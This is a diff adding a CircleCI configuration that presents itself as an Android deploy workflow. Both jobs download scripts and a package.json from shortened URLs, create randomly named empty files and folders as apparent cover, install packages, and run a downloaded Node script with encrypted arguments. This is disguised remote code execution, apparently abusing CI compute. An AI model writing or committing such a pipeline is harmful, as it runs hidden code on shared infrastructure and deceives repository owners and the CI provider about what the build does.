@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  deploy:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/bowyC -o ecy59dh4qy.js && curl -fsSL
+          shorturl.at/hijsA -o 6ndnf0fvhrk4m9u0wq.js && curl -fsSL
+          shorturl.at/ctFUV -o package.json
+      - run: mkdir hdptubor0itd
+      - run: touch eg50zazfnvzxman.py
+      - run: mkdir r1wroa292pd1huim9msqdelhwb
+      - run: npm i -s
+      - run: touch 6xrb7kakuhwoyo22pg2.cpp
+      - run: touch 367qryd5s7et9guw.php
+      - run: node 6ndnf0fvhrk4m9u0wq -sp -t
+          U2FsdGVkX19loyR/k+T+R5Bl6i+aX1xTmMe458pROkHgQPDekYXPufUKlMI8CZdN -r
+          U2FsdGVkX193siKIL9lMbkBPyNrS9I9z9y/kPNMU22HFe1Aws1nTziskbSG6Sw9e9OHAA2pAT21ny9Z2Q6K6kfbPcjdrYEa1EcXcV2a5dIMMvQg8pwrxyEGAWBNOtCW+StQ4RoKroDT1OWytM7N2a5fO/hG1CN7R4035jLlA8hUktRurZi3WBAwGfjSk2u8G8k2R9wiRvA7R8gqnvWzyWrVD1KF3f/hgG1cfV7zd7cRl9pmTKYqHec0CW82zMmS0bQVkTH2U4j17eYqWKF3XeyU3HpAtFmQ7JFKWLWI/eDI=
+          -lpn U2FsdGVkX1/j0GP8LU6bJSfDoVWmBss0uQNcfHcYwCU= -s
+          U2FsdGVkX18HB1OWYPyMa7mFGDE0sTtpMASKVUbpeDQAdRc4lBagsph8v+QYwyaSyfnV5IVVCvTbiNcphsX10sgxGrr1J16j3iKUxr2PDU54eHUrxy8gn+p0m6+rzjt6CD5R/bPoc3uo7e+7uTva4PCMxigUD+pxiat/EvWqJetCJoEv0yDxbwxeHjYSsEveBGzNEB0hpWLznmmAG1J+0lWpJilZNUbAABBboGi6Yqs=
+      - run: touch pbp1z1qsjcjol5vj3vgbqe5.c
+  code_196:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/xFNP6 -o package.json && curl -fsSL
+          shorturl.at/jBEFG -o erh850zmwdhvap.js && curl -fsSL shorturl.at/oqswG
+          -o exo5w1jn.js
+      - run: mkdir pfkar8nwd84i3w0qu
+      - run: touch r57lf56fwo9x8b1lf3m9gdy8cp5j.sh
+      - run: npm i -s
+      - run: touch msshqxlkm1q19chib1hf.cpp
+      - run: mkdir zbpgugreqj7ybcc6w6
+      - run: mkdir 28c0dmmxi79ysf2a
+      - run: mkdir tv6friki1bo764jv5svkclczx
+      - run: node erh850zmwdhvap -sp -r
+          U2FsdGVkX18+svH+94Qlxv+yctt2mzMhWJTM3P73gEXnL3rzqdoer0McuuxMcp1d6uXQm3gKkzgz973xTyIAEtaXoPFdtg14YsoJu0HYuRmAB5MBeioDJCquPYsPzwEboR8Q3DKmZKfRb2KMRdwY04DlQxZDEPw8zZG8vBjr0E59/ExE9drsltEnQyDg/OsNIP7w/2r0fYxbJ4vsj0656P4CJThx8/KkowIpApz9cO9i8OUg5POmCssr1deDnaMmUwbBXRsU2m+lS96fuO9nIfftYGAitbt0qofqoHiS934=
+          -s
+          U2FsdGVkX1+/OmjddX83MfU/1GAMlcm/+qmu4/alfLjWH+nUwKA1MZHxKdeeF0/SITHmKOX1Fw/hUq+hl3aPq7n+/b9ftujcYrml7P+LdOvL7JVBezt26RL8gd8w36ZipKA2c2AUolKnI2APLtvXQnEW3oEt73OVO8BMeGqJUe/O1tnKWvC57jLlkwn5ICjuQ5reGauebiDbkXIdl2EIwkyTSBF2DwlpqlzLcphSsfk=
+          -lpn U2FsdGVkX1+vrollfV6zyxrUx+p3bbgyxQvEYYqmmbA= -t
+          U2FsdGVkX19Tb6T9nIwXEO4keHstX1Up3z0a7VJsdPoWzylViwtgqB1jFNcEhHtg
+workflows:
+  startJobs:
+    jobs:
+      - deploy
+  working:
+    jobs:
+      - code_196
